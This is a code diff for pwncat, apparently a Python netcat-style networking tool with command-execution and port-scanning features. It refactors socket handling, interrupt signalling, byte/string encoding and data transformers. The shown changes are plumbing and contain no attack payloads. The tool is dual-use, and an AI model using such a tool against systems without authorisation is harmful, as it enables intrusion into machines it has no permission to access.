@@ -9,7 +9,7 @@
 #  4. Transformer
 #  5. IO modules
 #  6. PSE Store
-#  7. IO Runner
+#  7. IO Runner / InterruptHandler
 #  8. Command & Control
 #  9. Command line arguments
 # 10. Main entrypoint
@@ -49,7 +49,7 @@
 #
 # 4. Signaling / Interrupts
 # ------------------------------------
-# The StopSignal instance is distributed across all Threads and and the Runner instance and
+# The InterruptHandler instance is distributed across all Threads and and the Runner instance and
 # is a way to let other Threads know that a stop signal has been requested.
 # Producer/Consumer can implement their own interrupt function so they can be stopped from
 # inside (if they do non-blocking stuff) or from outside (if they do blocking stuff).
@@ -58,17 +58,18 @@ from __future__ import print_function
 from abc import abstractmethod
 from abc import ABCMeta
 
+from datetime import datetime
 from subprocess import PIPE
 from subprocess import Popen
 from subprocess import STDOUT
 
 import argparse
-import atexit
 import base64
 import logging
 import os
 import re
 import select
+import signal
 import socket
 import sys
 import threading
@@ -127,12 +128,12 @@ if os.environ.get("MYPY_CHECK", False):
 
 APPNAME = "pwncat"
 APPREPO = "https://github.com/cytopia/pwncat"
-VERSION = "0.0.23-alpha"
+VERSION = "0.1.0"
 
 # Default timeout for timeout-based sys.stdin and socket.recv
-TIMEOUT_READ_STDIN = 0.1
-TIMEOUT_RECV_SOCKET = 0.1
-TIMEOUT_RECV_SOCKET_RETRY = 2
+TIMEOUT_READ_STDIN = 0.05
+TIMEOUT_RECV_SOCKET = 0.05
+TIMEOUT_RECV_SOCKET_RETRY = 1
 
 # https://docs.python.org/3/library/subprocess.html#popen-constructor
 # * 0 means unbuffered (read and write are one system call and can return short)
@@ -214,7 +215,7 @@ class DsCallableProducer(object):
     # --------------------------------------------------------------------------
     @property
     def function(self):
-        # type: () -> Callable[..., Iterator[str]]
+        # type: () -> Callable[..., Iterator[bytes]]
         """`IO.producer`: Callable funtcion function."""
         return self.__function
 
@@ -234,7 +235,7 @@ class DsCallableProducer(object):
     # Contrcutor
     # --------------------------------------------------------------------------
     def __init__(self, function, *args, **kwargs):
-        # type: (Callable[..., Iterator[str]], Any, Any) -> None
+        # type: (Callable[..., Iterator[bytes]], Any, Any) -> None
         self.__function = function
         self.__args = args
         self.__kwargs = kwargs
@@ -257,7 +258,7 @@ class DsRunnerAction(object):
 
     @property
     def consumer(self):
-        # type: () -> Callable[[str], None]
+        # type: () -> Callable[[bytes], None]
         """`IO.consumer`: Data consumer function."""
         return self.__consumer
 
@@ -274,6 +275,12 @@ class DsRunnerAction(object):
         return self.__transformers
 
     @property
+    def daemon_thread(self):
+        # type: () -> bool
+        """`bool`: Determines if the action will be started in a daemon thread."""
+        return self.__daemon_thread
+
+    @property
     def code(self):
         # type: () -> Optional[Union[str, bytes, CodeType]]
         """`ast.AST`: custom Python code which provides a `transform(data, pse) -> str` function."""
@@ -285,9 +292,10 @@ class DsRunnerAction(object):
     def __init__(
         self,
         producer,  # type: DsCallableProducer
-        consumer,  # type: Callable[[str], None]
+        consumer,  # type: Callable[[bytes], None]
         interrupts,  # type: List[Callable[[], None]]
         transformers,  # type: List[Transform]
+        daemon_thread,  # type: bool
         code,  # type: Optional[Union[str, bytes, CodeType]]
     ):
         # type: (...) -> None
@@ -295,6 +303,7 @@ class DsRunnerAction(object):
         self.__consumer = consumer
         self.__interrupts = interrupts
         self.__transformers = transformers
+        self.__daemon_thread = daemon_thread
         self.__code = code
 
 
@@ -332,10 +341,10 @@ class DsRunnerTimer(object):
         return self.__kwargs
 
     @property
-    def signal(self):
-        # type: () -> StopSignal
-        """`StopSignal`: StopSignal instance."""
-        return self.__signal
+    def ssig(self):
+        # type: () -> InterruptHandler
+        """`InterruptHandler`: InterruptHandler instance."""
+        return self.__ssig
 
     # --------------------------------------------------------------------------
     # Constructor
@@ -343,16 +352,16 @@ class DsRunnerTimer(object):
     def __init__(
         self,
         action,  # type: Callable[..., None]
-        signal,  # type: StopSignal
+        ssig,  # type: InterruptHandler
         intvl,  # type: int
-        *args,  # type: Tuple[Any, ...]
-        **kwargs  # type: Dict[str, Any]
+        args,  # type: Tuple[Any, ...]
+        kwargs,  # type: Dict[str, Any]
     ):
         # type: (...) -> None
         assert type(intvl) is int, type(intvl)
         assert type(kwargs) is dict, type(kwargs)
         self.__action = action
-        self.__signal = signal
+        self.__ssig = ssig
         self.__intvl = intvl
         self.__args = args
         self.__kwargs = kwargs
@@ -398,10 +407,10 @@ class DsRunnerRepeater(object):
         return self.__kwargs
 
     @property
-    def signal(self):
-        # type: () -> StopSignal
-        """`StopSignal`: StopSignal instance."""
-        return self.__signal
+    def ssig(self):
+        # type: () -> InterruptHandler
+        """`InterruptHandler`: InterruptHandler instance."""
+        return self.__ssig
 
     # --------------------------------------------------------------------------
     # Constructor
@@ -409,18 +418,18 @@ class DsRunnerRepeater(object):
     def __init__(
         self,
         action,  # type: Callable[..., None]
-        signal,  # type: StopSignal
+        ssig,  # type: InterruptHandler
         repeat,  # type: int
         pause,  # type: float
-        *args,  # type: Tuple[Any, ...]
-        **kwargs  # type: Dict[str, Any]
+        args,  # type: Tuple[Any, ...]
+        kwargs,  # type: Dict[str, Any]
     ):
         # type: (...) -> None
         assert type(repeat) is int, type(repeat)
         assert type(pause) is float, type(pause)
         assert type(kwargs) is dict, type(kwargs)
         self.__action = action
-        self.__signal = signal
+        self.__ssig = ssig
         self.__repeat = repeat
         self.__pause = pause
         self.__args = args
@@ -765,8 +774,8 @@ class DsTransformSafeword(object):
     # --------------------------------------------------------------------------
     @property
     def ssig(self):
-        # type: () -> StopSignal
-        """`StopSignal`: StopSignal instance to trigger a shutdown signal."""
+        # type: () -> InterruptHandler
+        """`InterruptHandler`: InterruptHandler instance to trigger a shutdown signal."""
         return self.__ssig
 
     @property
@@ -779,7 +788,7 @@ class DsTransformSafeword(object):
     # Constructor
     # --------------------------------------------------------------------------
     def __init__(self, ssig, safeword):
-        # type: (StopSignal, str) -> None
+        # type: (InterruptHandler, str) -> None
         super(DsTransformSafeword, self).__init__()
         self.__ssig = ssig
         self.__safeword = safeword
@@ -806,14 +815,21 @@ class DsIOStdinStdout(object):
         """`float`: Input timeout in seconds for non-blocking read or `None` for blocking."""
         return self.__input_timeout
 
+    @property
+    def send_on_eof(self):
+        # type: () -> bool
+        """`float`: Determines if we buffer STDIN until EOF before sending."""
+        return self.__send_on_eof
+
     # --------------------------------------------------------------------------
     # Constructor
     # --------------------------------------------------------------------------
-    def __init__(self, encoder, input_timeout):
-        # type: (StringEncoder, Optional[float]) -> None
+    def __init__(self, encoder, input_timeout, send_on_eof):
+        # type: (StringEncoder, Optional[float], bool) -> None
         super(DsIOStdinStdout, self).__init__()
         self.__enc = encoder
         self.__input_timeout = input_timeout
+        self.__send_on_eof = send_on_eof
 
 
 # -------------------------------------------------------------------------------------------------
@@ -869,7 +885,7 @@ class DsIOCommand(object):
 # #################################################################################################
 
 # -------------------------------------------------------------------------------------------------
-# [3/11 LIBRARY CLASSES]: (1/4) TraceLogger
+# [3/11 LIBRARY CLASSES]: (1/3) TraceLogger
 # -------------------------------------------------------------------------------------------------
 class TraceLogger(logging.getLoggerClass()):  # type: ignore
     """Extend Python's default logger class with TRACE level logging."""
@@ -909,7 +925,7 @@ class TraceLogger(logging.getLoggerClass()):  # type: ignore
 
 
 # -------------------------------------------------------------------------------------------------
-# [3/11 LIBRARY CLASSES]: (2/4) ColoredLogFormatter
+# [3/11 LIBRARY CLASSES]: (2/3) ColoredLogFormatter
 # -------------------------------------------------------------------------------------------------
 class ColoredLogFormatter(logging.Formatter):
     """Custom log formatter which adds different details and color support."""
@@ -982,7 +998,7 @@ class ColoredLogFormatter(logging.Formatter):
 
 
 # -------------------------------------------------------------------------------------------------
-# [3/11 LIBRARY CLASSES]: (3/4) StringEncoder
+# [3/11 LIBRARY CLASSES]: (3/3) StringEncoder
 # -------------------------------------------------------------------------------------------------
 class StringEncoder(object):
     """Takes care about Python 2/3 string encoding/decoding.
@@ -991,71 +1007,72 @@ class StringEncoder(object):
     classes or functions as strings to keep full Python 2/3 compat.
     """
 
-    # --------------------------------------------------------------------------
-    # Constructor
-    # --------------------------------------------------------------------------
-    def __init__(self):
-        # type: () -> None
-        """Create a StringEncoder instance which converts str/bytes according to Python version."""
-        self.__py3 = sys.version_info >= (3, 0)  # type: bool
-
-        # https://stackoverflow.com/questions/606191/27527728#27527728
-        self.__codec = "cp437"
-        self.__fallback = "latin-1"
+    CODECS = [
+        "utf-8",
+        "cp437",
+        "latin-1",
+    ]
 
     # --------------------------------------------------------------------------
-    # Public Functions
+    # Class methods
     # --------------------------------------------------------------------------
-    def encode(self, data):
+    @classmethod
+    def rstrip(cls, data, search=None):
+        # type: (Union[bytes, str], Optional[str]) -> Union[bytes, str]
+        """Implementation of rstring which works on bytes or strings."""
+        # We have a bytes object in Python3
+        if sys.version_info >= (3, 0) and type(data) is not str:
+            # Strip whitespace
+            if search is None:
+                while True:
+                    new = data
+                    new = cls.rstrip(new, " ")
+                    new = cls.rstrip(new, "\n")
+                    new = cls.rstrip(new, "\r")
+                    new = cls.rstrip(new, "\t")
+                    # Loop until no more changes occur
+                    if new == data:
+                        return new
+            else:
+                bsearch = StringEncoder.encode(search)
+                while data[-1:] == bsearch:
+                    data = data[:-1]
+                return data
+
+        # Use native function
+        if search is None:
+            return data.rstrip()
+        return data.rstrip(search)  # type: ignore
+
+    @classmethod
+    def encode(cls, data):
         # type: (str) -> bytes
         """Convert string into a byte type for Python3."""
-        if self.__py3:
-            try:
-                return data.encode(self.__codec)
-            except UnicodeEncodeError:
-                # TODO: Add logging
-                return data.encode(self.__fallback)
+        if sys.version_info >= (3, 0):
+            for codec in cls.CODECS:
+                # On the last codec, do not catch the exception and let it trigger if it fails
+                if codec == cls.CODECS[-1]:
+                    return data.encode(codec)
+                try:
+                    return data.encode(codec)
+                except UnicodeEncodeError:
+                    pass
         return data  # type: ignore
 
-    def decode(self, data):
+    @classmethod
+    def decode(cls, data):
         # type: (bytes) -> str
         """Convert bytes into a string type for Python3."""
-        if self.__py3:
-            return data.decode(self.__codec)
+        if sys.version_info >= (3, 0):
+            for codec in cls.CODECS:
+                # On the last codec, do not catch the exception and let it trigger if it fails
+                if codec == cls.CODECS[-1]:
+                    return data.decode(codec)
+                try:
+                    return data.decode(codec)
+                except UnicodeDecodeError:
+                    pass
         return data  # type: ignore
-
-    def base64_encode(self, data):
-        # type: (str) -> str
-        """Convert string into a base64 encoded string."""
-        return self.decode(base64.b64encode(self.encode(data)))
-
-
-# -------------------------------------------------------------------------------------------------
-# [3/11 LIBRARY CLASSES]: (4/4): StopSignal
-# -------------------------------------------------------------------------------------------------
-class StopSignal(object):
-    """Provide a simple boolean switch."""
-
-    # --------------------------------------------------------------------------
-    # Constructor
-    # --------------------------------------------------------------------------
-    def __init__(self):
-        # type: () -> None
-        """Create a StopSignal instance."""
-        self.__stop = False
-
-    # --------------------------------------------------------------------------
-    # Public Functions
-    # --------------------------------------------------------------------------
-    def has_stop(self):
-        # type: () -> bool
-        """Check if a stop signal has been raised."""
-        return self.__stop
-
-    def raise_stop(self):
-        # type: () -> None
-        """Raise a stop signal."""
-        self.__stop = True
 
 
 # #################################################################################################
@@ -1070,7 +1087,7 @@ class StopSignal(object):
 # [4/11 NETWORK]: (1/1) Sock
 # -------------------------------------------------------------------------------------------------
 class Sock(_Singleton("SingletonMeta", (object,), {})):  # type: ignore
-    """Thread-safe singleton Socket helper to emulate a module within the same file."""
+    """Thread-safe singleton Socket wrapper to emulate a module within the same file."""
 
     def __init__(self):
         # type: () -> None
@@ -1421,13 +1438,14 @@ class Sock(_Singleton("SingletonMeta", (object,), {})):  # type: ignore
     # --------------------------------------------------------------------------
     # Create functions
     # --------------------------------------------------------------------------
-    def create_socket(self, family, sock_type, ip_tos_name=None):
-        # type: (Union[socket.AddressFamily, int], int, Optional[str]) -> socket.socket
+    def create_socket(self, family, sock_type, reuse_addr, ip_tos_name=None):
+        # type: (Union[socket.AddressFamily, int], int, bool, Optional[str]) -> socket.socket
         """Create TCP or UDP socket.
 
         Args:
             family (socket.family): The address family for which to create the socket for.
             sock_type (int): The socket type: socket.SOCK_DGRAM or socket.SOCK_STREAM
+            reuse_addr (bool): Set SO_REUSEADDR on the socket.
             ip_tos_name (str): Optional IP type of service value to apply to socket
 
         Returns:
@@ -1471,7 +1489,8 @@ class Sock(_Singleton("SingletonMeta", (object,), {})):  # type: ignore
 
         # Get around the "[Errno 98] Address already in use" error, if the socket is still in wait
         # we instruct it to reuse the address anyway.
-        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        if reuse_addr:
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
         # If requested, set IP Type of Service value for current socket
         if ip_tos_name is not None:
@@ -1530,27 +1549,38 @@ class Sock(_Singleton("SingletonMeta", (object,), {})):  # type: ignore
             self.__log.error(msg)
             raise socket.error(msg)
 
-    def accept(self, sockets, fstop):
-        # type: (List[socket.socket], Callable[[], bool]) -> Tuple[socket.socket, Tuple[str, int]]
+    def accept(
+        self,
+        sockets,  # type: List[socket.socket]
+        has_quit,  # type: Callable[[], bool]
+        select_timeout=0.01,  # type: float
+    ):
+        # type: (...) -> Tuple[socket.socket, Tuple[str, int]]
         """Accept a single connection from given list of sockets.
 
         Given sockets must be bound to an addr and listening for connections.
 
         Args:
             sock ([socket.socket]): List of sockets IPv4 and/or IPv6 to accept on.
-            fstop (Callable[[], bool]): A function that returns True if abort is requested.
+            has_quit (Callable[[], bool]): A function that returns True if abort is requested.
+            select_timeout (float): Timeout to poll sockets for connected clients.
 
         Returns:
-            socket.socket: Returns the connection socket (whatever protocol was faster).
+            (socket.socket, str, int): Returns tuple of socket, address and port of client.
 
         Raises:
             socket.error: Raised if server cannot accept connection or stop signal is requested.
         """
         self.__log.debug("Waiting for TCP client")
         while True:
-            ssockets = select.select(sockets, [], [], 0.01)[0]  # type: List[socket.socket]
-            if fstop():
-                raise socket.error("StopSignal acknknowledged")
+            try:
+                ssockets = select.select(sockets, [], [], select_timeout)[
+                    0
+                ]  # type: List[socket.socket]
+            except select.error as err:
+                raise socket.error(err)
+            if has_quit():
+                raise socket.error("SOCK-QUIT signal ACK for accept(): raised socket.error()")
             for sock in ssockets:
                 try:
                     conn, addr = sock.accept()
@@ -1588,13 +1618,18 @@ class Sock(_Singleton("SingletonMeta", (object,), {})):  # type: ignore
             port (int): Port of server to connect to.
 
         Returns:
-            Tuple[str,int]: Adress/port tuple of local bin of the client.
+            Tuple[str,int]: Adress/port tuple of local bind of the client.
 
         Raises:
             socker.error: If client cannot connect to remote peer or custom bind did not succeed.
         """
-        sock_family_name = self.get_family_name(sock.family)
-        sock_type_name = self.get_type_name(sock.type)
+        try:
+            # If the socket was already closed elsewhere, it won't have family or type anymore
+            sock_family_name = self.get_family_name(sock.family)
+            sock_type_name = self.get_type_name(sock.type)
+        except AttributeError as error:
+            raise socket.error(error)
+
         # Bind to a custom addr/port
         if src_addr is not None and src_port is not None:
             try:
@@ -1663,29 +1698,72 @@ class Sock(_Singleton("SingletonMeta", (object,), {})):  # type: ignore
     # --------------------------------------------------------------------------
     # Destroy functions
     # --------------------------------------------------------------------------
-    def close(self, sock, name):
+    def shutdown_recv(self, sock, name):
         # type: (socket.socket, str) -> None
-        """Shuts down and closes a socket.
+        """Shuts down a socket for receiving data (only allow to send data).
 
         Args:
             name (str): Name of the socket used for logging purposes.
-            sock (str): Socket to shutdown and close.
+            sock (str): Socket to shutdown for receive.
         """
         try:
             # (SHUT_RD)   0 = Done receiving (disallows receiving)
             # (SHUT_WR)   1 = Done sending (disallows sending)
             # (SHUT_RDWR) 2 = Both
-            self.__log.trace("Shutting down %s socket", name)  # type: ignore
+            self.__log.trace("Shutting down %s socket for receiving", name)  # type: ignore
+            sock.shutdown(socket.SHUT_RD)
+        except (OSError, socket.error):
+            # We do not log errors here, as unconnected sockets cannot
+            # be shutdown and we want to throw any socket at this function.
+            pass
+
+    def shutdown_send(self, sock, name):
+        # type: (socket.socket, str) -> None
+        """Shuts down a socket for sending data (only allow to receive data).
+
+        Args:
+            name (str): Name of the socket used for logging purposes.
+            sock (str): Socket to shutdown for send.
+        """
+        try:
+            # (SHUT_RD)   0 = Done receiving (disallows receiving)
+            # (SHUT_WR)   1 = Done sending (disallows sending)
+            # (SHUT_RDWR) 2 = Both
+            self.__log.trace("Shutting down %s socket for sending", name)  # type: ignore
+            sock.shutdown(socket.SHUT_WR)
+        except (OSError, socket.error):
+            # We do not log errors here, as unconnected sockets cannot
+            # be shutdown and we want to throw any socket at this function.
+            pass
+
+    def close(self, sock, name):  # pylint: disable=unused-argument,no-self-use
+        # type: (socket.socket, str) -> None
+        """Shuts down and closes a socket.
+
+        Args:
+            sock (socket.socket): Socket to shutdown and close.
+            name (str): Name of the socket used for logging purposes.
+        """
+        # NOTE: Logging is removed here as this is too much overhead when using
+        # the port scanner (it will have thousands of threads and too many
+        # calls to the logger which will cause issues with its shutdown
+        # and a massive performance degrade as well.
+        try:
+            # (SHUT_RD)   0 = Done receiving (disallows receiving)
+            # (SHUT_WR)   1 = Done sending (disallows sending)
+            # (SHUT_RDWR) 2 = Both
+            # self.__log.trace("Shutting down %s socket", name)  # type: ignore
             sock.shutdown(socket.SHUT_RDWR)
-        except (OSError, socket.error) as error:
+        except (OSError, socket.error):
             # We do not log errors here, as unconnected sockets cannot
             # be shutdown and we want to throw any socket at this function.
             pass
         try:
-            self.__log.trace("Closing %s socket", name)  # type: ignore
+            # self.__log.trace("Closing %s socket", name)  # type: ignore
             sock.close()
-        except (OSError, socket.error) as error:
-            self.__log.trace("Could not close %s socket: %s", name, error)  # type: ignore
+        except (OSError, socket.error):
+            pass
+            # self.__log.trace("Could not close %s socket: %s", name, error)  # type: ignore
 
 
 class Net(object):
@@ -1695,12 +1773,12 @@ class Net(object):
     # Constructor / Destructor
     # --------------------------------------------------------------------------
     def __init__(self, encoder, ssig, options):
-        # type: (StringEncoder, StopSignal, DsSock) -> None
+        # type: (StringEncoder, InterruptHandler, DsSock) -> None
         """Instantiate Sock class.
 
         Args:
             encoder (StringEncoder): Instance of StringEncoder (Python2/3 str/byte compat).
-            ssig (StopSignal): Used to stop blocking loops.
+            ssig (InterruptHandler): Used to stop blocking loops.
             options (DsSock): Instance of DsSock.
         """
         self.__log = logging.getLogger(__name__)  # type: logging.Logger
@@ -1769,15 +1847,23 @@ class Net(object):
     # --------------------------------------------------------------------------
     # Public Send / Receive Functions
     # --------------------------------------------------------------------------
+    def send_eof(self):
+        # type: () -> None
+        """Close the active socket for sending. The remote part will get an EOF."""
+        self.__sock.shutdown_send(self.__active["conn"], "conn")
+
     def send(self, data):
-        # type: (str) -> int
+        # type: (bytes) -> int
         """Send data through a connected (TCP) or unconnected (UDP) socket.
 
         Args:
-            data (str): The data to send.
+            data (bytes): The data to send.
 
         Returns:
             int: Returns total bytes sent.
+
+        Raises:
+            socket.error:   Except here when unconnected or connection was forcibly closed.
         """
         # UDP has some specialities as its socket is unconnected.
         # See also recv() for specialities on that side.
@@ -1789,16 +1875,18 @@ class Net(object):
             if not self.__active:
                 self.__log.warning("UDP client has not yet connected. Queueing message")
                 while not self.__active:
+                    if self.__ssig.has_sock_quit():
+                        self.__log.trace(  # type: ignore
+                            "SOCK-QUIT signal ACK in Net.send (while waiting for UDP client)"
+                        )
+                        return -1
                     time.sleep(0.01)
 
         curr = 0  # bytes send during one loop iteration
         send = 0  # total bytes send
         size = len(data)  # bytes of data that needs to be send
-        byte = self.__enc.encode(data)
-        assert size == len(byte), "Encoding messed up string length, might need to do len() after."
 
         # Loop until all bytes have been send
-        # TODO: Does this make it impossible to send nullbytes (Ctrl+d)
         while send < size:
             self.__log.debug(
                 "Trying to send %d bytes to %s:%d",
@@ -1806,23 +1894,23 @@ class Net(object):
                 self.__active["remote_addr"],
                 self.__active["remote_port"],
             )
-            self.__log.trace("Trying to send: %s", repr(byte))  # type: ignore
+            self.__log.trace("Trying to send: %s", repr(data))  # type: ignore
             try:
                 # Only UDP server has not made a connect() to the socket, all others
                 # are already connected and need to use send() instead of sendto()
                 if self.__udp_mode_server:
                     curr = self.__active["conn"].sendto(
-                        byte, (self.__active["remote_addr"], self.__active["remote_port"])
+                        data, (self.__active["remote_addr"], self.__active["remote_port"])
                     )
                     send += curr
                 else:
-                    curr = self.__active["conn"].send(byte)
+                    curr = self.__active["conn"].send(data)
                     send += curr
                 if curr == 0:
                     self.__log.error("No bytes send during loop round.")
                     return 0
                 # Remove 'curr' many bytes from byte for the next round
-                byte = byte[curr:]
+                data = data[curr:]
                 self.__log.debug(
                     "Sent %d bytes to %s:%d (%d bytes remaining)",
                     curr,
@@ -1830,23 +1918,23 @@ class Net(object):
                     self.__active["remote_port"],
                     size - send,
                 )
-            except (OSError, socket.error) as error:
-                self.__log.error("Socket OS Error: %s", error)
-                return send
+            except (IOError, OSError, socket.error) as error:
+                msg = "Socket send Error: {}".format(error)
+                raise socket.error(msg)
         return send
 
     def receive(self):
-        # type: () -> str
+        # type: () -> bytes
         """Receive and return data from the connected (TCP) or unconnected (UDP) socket.
 
         Returns:
-            str: Returns received data from connected (TCP) or unconnected (UDP) socket.
+            bytes: Returns received data from connected (TCP) or unconnected (UDP) socket.
 
         Raises:
             socket.timeout: Except here to do an action when the socket is not busy.
             AttributeError: Except here when current instance has closed itself (Ctrl+c).
             socket.error:   Except here when unconnected or connection was forcibly closed.
-            EOFError:       Except here when upstream has closed the connection.
+            EOFError:       Except here when upstream has closed the connection via EOF.
         """
         # This is required for a UDP server that has no connected clients yet
         # and is waiting for data receival for the first time on either IPv4 or IPv6
@@ -1862,9 +1950,9 @@ class Net(object):
                 0
             ]  # type: List[socket.socket]
         # E.g.: ValueError: file descriptor cannot be a negative integer (-1)
-        except (ValueError, AttributeError):
-            msg = "Connection was closed by self."
-            self.__log.warning(msg)
+        except (ValueError, AttributeError) as error:
+            msg = "Connection was closed by self: [1]: {}".format(error)
+            self.__log.debug(msg)
             raise AttributeError(msg)
         if not conns:
             # This is raised for the calling function to determine what to do
@@ -1876,12 +1964,12 @@ class Net(object):
         conn = conns[0]  # type: socket.socket
         try:
             # https://manpages.debian.org/buster/manpages-dev/recv.2.en.html
-            (byte, addr) = conn.recvfrom(self.__options.bufsize)
+            (data, addr) = conn.recvfrom(self.__options.bufsize)
 
         # [1/5] When closing itself (e.g.: via Ctrl+c and the socket_close() funcs are called)
-        except AttributeError:
-            msg = "Connection was closed by self."
-            self.__log.warning(msg)
+        except AttributeError as error:
+            msg = "Connection was closed by self: [2]: {}".format(error)
+            self.__log.debug(msg)
             raise AttributeError(msg)
 
         # [2/5] Connection was forcibly closed
@@ -1889,14 +1977,14 @@ class Net(object):
         # [Errno 10054] An existing connection was forcibly closed by the remote host
         # [WinError 10054] An existing connection was forcibly closed by the remote host
         except (OSError, socket.error) as error:
-            self.__log.warning("Connection error: %s", error)
+            self.__log.debug("Connection error: %s", error)
             raise socket.error(error)
 
         # [3/5] Upstream (server or client) is gone.
         # In TCP, there is no such thing as an empty message, so zero means a peer disconnect.
         # In UDP, there is no such thing as a peer disconnect, so zero means an empty datagram.
-        if not byte:
-            msg = "Upstream has closed the connection."
+        if not data:
+            msg = "EOF: Remote finished sending."
             self.__log.info(msg)
             raise EOFError(msg)
 
@@ -1934,7 +2022,6 @@ class Net(object):
             }
 
         # [5/5] We have data to process
-        data = self.__enc.decode(byte)
         self.__log.debug(
             "Received %d bytes from %s:%d",
             len(data),
@@ -1969,6 +2056,7 @@ class Net(object):
                     "conn": self.__sock.create_socket(
                         family,
                         socket.SOCK_DGRAM if self.__options.udp else socket.SOCK_STREAM,
+                        True,
                         self.__options.ip_tos,
                     )
                 }
@@ -2073,6 +2161,7 @@ class Net(object):
                     "sock": self.__sock.create_socket(
                         family,
                         socket.SOCK_DGRAM if self.__options.udp else socket.SOCK_STREAM,
+                        True,
                         self.__options.ip_tos,
                     )
                 }
@@ -2171,24 +2260,27 @@ class Net(object):
             return False
 
         # (2/3) Accept
+        remove = {}
         try:
             conn, client = self.__sock.accept(
-                [conns[family]["sock"] for family in conns], self.__ssig.has_stop
+                [conns[family]["sock"] for family in conns], self.__ssig.has_sock_quit
             )
             conns[conn.family]["conn"] = conn
             conns[conn.family]["remote_addr"] = client[0]
             conns[conn.family]["remote_port"] = client[1]
         except socket.error as err:
-            # On error, remove all bind sockets
-            for family in conns:
-                self.__log.debug(
-                    "Removing (family %d/%s) due to: %s",
-                    family,
-                    self.__sock.get_family_name(family),
-                    err,
-                )
-                self.__sock.close(conns[family]["sock"], self.__sock.get_family_name(family))
-                del conns[family]
+            remove = {family: str(err) for family in conns}
+        # On error, remove all bind sockets
+        for family in remove:
+            self.__log.debug(
+                "Removing (family %d/%s) due to: %s",
+                family,
+                self.__sock.get_family_name(family),
+                remove[family],
+            )
+            self.__sock.close(conns[family]["sock"], self.__sock.get_family_name(family))
+            del conns[family]
+        if not conns:
             return False
 
         # (3/3) Store connections
@@ -2221,7 +2313,7 @@ class Net(object):
         # [2/3] Accept
         try:
             conn, client = self.__sock.accept(
-                [self.__conns[family]["sock"] for family in self.__conns], self.__ssig.has_stop
+                [self.__conns[family]["sock"] for family in self.__conns], self.__ssig.has_sock_quit
             )
         except socket.error:
             return False
@@ -2262,7 +2354,7 @@ class Net(object):
 # #################################################################################################
 
 # -------------------------------------------------------------------------------------------------
-# [5/11 TRANSFORM]: (1/3): Transform
+# [5/11 TRANSFORM]: (1/5): Transform
 # -------------------------------------------------------------------------------------------------
 class Transform(ABC):  # type: ignore
     """Abstract class to for pwncat I/O transformers.
@@ -2294,16 +2386,19 @@ class Transform(ABC):  # type: ignore
     # --------------------------------------------------------------------------
     @abstractmethod
     def transform(self, data):
-        # type: (str) -> str
+        # type: (bytes) -> bytes
         """Implement a transformer function which transforms a string..
 
+        Args:
+            data (bytes): data to be transformed.
+
         Returns:
-            str: The transformed string.
+            bytes: The transformed string.
         """
 
 
 # -------------------------------------------------------------------------------------------------
-# [5/11 TRANSFORM]: (2/3) TransformLinefeed
+# [5/11 TRANSFORM]: (2/5) TransformLinefeed
 # -------------------------------------------------------------------------------------------------
 class TransformLinefeed(Transform):
     """Implement basic linefeed replacement."""
@@ -2326,7 +2421,7 @@ class TransformLinefeed(Transform):
     # Public Functions
     # --------------------------------------------------------------------------
     def transform(self, data):
-        # type: (str) -> str
+        # type: (bytes) -> bytes
         """Transform linefeeds to CRLF, LF or CR if requested.
 
         Returns:
@@ -2338,46 +2433,46 @@ class TransformLinefeed(Transform):
 
         # ? -> No line feeds
         if self.__opts.crlf == "no":
-            if data.endswith("\r\n"):
+            if data[-2:] == StringEncoder.encode("\r\n"):
                 self.log.debug("Removing CRLF")
                 return data[:-2]
-            if data.endswith("\n"):
+            if data[-1:] == StringEncoder.encode("\n"):
                 self.log.debug("Removing LF")
                 return data[:-1]
-            if data.endswith("\r"):
+            if data[-1:] == StringEncoder.encode("\r"):
                 self.log.debug("Removing CR")
                 return data[:-1]
         # ? -> CRLF
-        if self.__opts.crlf == "crlf" and not data.endswith("\r\n"):
-            if data.endswith("\n"):
+        if self.__opts.crlf == "crlf" and data[-2:] != StringEncoder.encode("\r\n"):
+            if data[-1:] == StringEncoder.encode("\n"):
                 self.log.debug("Replacing LF with CRLF")
-                return data[:-1] + "\r\n"
-            if data.endswith("\r"):
+                return data[:-1] + StringEncoder.encode("\r\n")
+            if data[-1:] == StringEncoder.encode("\r"):
                 self.log.debug("Replacing CR with CRLF")
-                return data[:-1] + "\r\n"
+                return data[:-1] + StringEncoder.encode("\r\n")
         # ? -> LF
         if self.__opts.crlf == "lf":
-            if data.endswith("\r\n"):
+            if data[-2:] == StringEncoder.encode("\r\n"):
                 self.log.debug("Replacing CRLF with LF")
-                return data[:-2] + "\n"
-            if data.endswith("\r"):
+                return data[:-2] + StringEncoder.encode("\n")
+            if data[-1:] == StringEncoder.encode("\r"):
                 self.log.debug("Replacing CR with LF")
-                return data[:-1] + "\n"
+                return data[:-1] + StringEncoder.encode("\n")
         # ? -> CR
         if self.__opts.crlf == "cr":
-            if data.endswith("\r\n"):
+            if data[-2:] == StringEncoder.encode("\r\n"):
                 self.log.debug("Replacing CRLF with CR")
-                return data[:-2] + "\r"
-            if data.endswith("\n"):
+                return data[:-2] + StringEncoder.encode("\r")
+            if data[-1:] == StringEncoder.encode("\n"):
                 self.log.debug("Replacing LF with CR")
-                return data[:-1] + "\r"
+                return data[:-1] + StringEncoder.encode("\r")
 
         # Otherwise just return it as it is
         return data
 
 
 # -------------------------------------------------------------------------------------------------
-# [5/11 TRANSFORM]: (3/3) TransformSafeword
+# [5/11 TRANSFORM]: (3/5) TransformSafeword
 # -------------------------------------------------------------------------------------------------
 class TransformSafeword(Transform):
     """Implement a trigger to emergency shutdown upon receival of a specific safeword."""
@@ -2401,16 +2496,164 @@ class TransformSafeword(Transform):
     # Public Functions
     # --------------------------------------------------------------------------
     def transform(self, data):
-        # type: (str) -> str
+        # type: (bytes) -> bytes
         """Raise a stop signal upon receiving the safeword.
 
         Returns:
             str: The string as it is without changes
         """
-        if self.__opts.safeword in data:
-            self.__log.info("Received safeword: raising stop signal.")
-            self.__opts.ssig.raise_stop()
+        if StringEncoder.encode(self.__opts.safeword) in data:
+            self.log.trace("TERMINATE signal RAISED in TransformSafeword.transform")  # type: ignore
+            self.__opts.ssig.raise_terminate()
         return data
+
+
+# -------------------------------------------------------------------------------------------------
+# [5/11 TRANSFORM]: (4/5) TransformHttpPack
+# -------------------------------------------------------------------------------------------------
+class TransformHttpPack(Transform):
+    """Implement a transformation to pack data into HTTP packets."""
+
+    # --------------------------------------------------------------------------
+    # Constructor / Destructor
+    # --------------------------------------------------------------------------
+    def __init__(self, opts):
